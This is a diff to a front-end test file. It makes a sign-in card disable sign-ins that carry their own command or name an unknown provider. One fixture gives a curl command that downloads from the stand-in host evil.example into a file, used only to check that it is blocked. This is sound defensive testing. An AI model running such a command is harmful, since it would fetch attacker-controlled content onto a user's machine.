@@ -87,9 +87,22 @@ describe('every field type', () => {
     expect(i?.hasAttribute('value')).toBe(false);
     expect(c.querySelector('[data-action="paste"]')?.getAttribute('aria-label')).toContain('Key');
   });
-  it('says a sign-in command runs on this computer, as the program and arguments shown, never a shell line', () => {
-    const c = mount(spec({ l: { 'x-signin': { provider: 'Claude', command: 'claude', args: ['auth', 'login', 'my profile'] } } }, ['l'], { kind: 'signin' }));
-    expect(c.querySelector('.cd-note')?.textContent).toBe("Runs claude auth login 'my profile' on this computer, then shows what it said.");
+  it('disables a sign-in that carries a command, or names a provider the host does not know, and says so; a known one shows the line the host runs', () => {
+    (host as { login?: unknown }).login = (s: { provider?: string; command?: string; args?: unknown }) => (s.command !== undefined || s.args !== undefined ? { known: false } : s.provider === 'gcloud' ? { known: true, line: 'gcloud auth login --brief' } : { known: false });
+    const btn = (c: HxCard): HTMLButtonElement | null => c.querySelector<HTMLButtonElement>('[data-action="signin"]');
+    const note = (c: HxCard): string => c.querySelector('.cd-note')?.textContent ?? '';
+    const withCommand = mount(spec({ l: { 'x-signin': { provider: 'gcloud', command: 'curl', args: ['-o', '/x', 'https://evil.example'] } } }, ['l'], { kind: 'signin' }));
+    expect(btn(withCommand)?.disabled).toBe(true);
+    expect(note(withCommand)).toBe('This sign-in is not one boopis knows.');
+    const unknown = mount(spec({ l: { 'x-signin': { provider: 'curl' } } }, ['l'], { kind: 'signin' }));
+    expect(btn(unknown)?.disabled).toBe(true);
+    expect(note(unknown)).toBe('This sign-in is not one boopis knows.');
+    const known = mount(spec({ l: { 'x-signin': { provider: 'gcloud' } } }, ['l'], { kind: 'signin' }));
+    expect(btn(known)?.disabled).toBe(false);
+    expect(note(known)).toBe('Runs gcloud auth login --brief on this computer, then shows what it said.');
+    const server = mount(spec({ l: { 'x-signin': { provider: 'Linear', server: 'linear', host: 'linear.app' } } }, ['l'], { kind: 'signin' }));
+    expect(btn(server)?.disabled).toBe(false);
+    expect(note(server)).toBe('Opens linear.app in your browser.');
   });
   it('tells the host when a running sign-in is cancelled, and goes back to open so it can be tried again', async () => {
     const stopped: string[] = [];
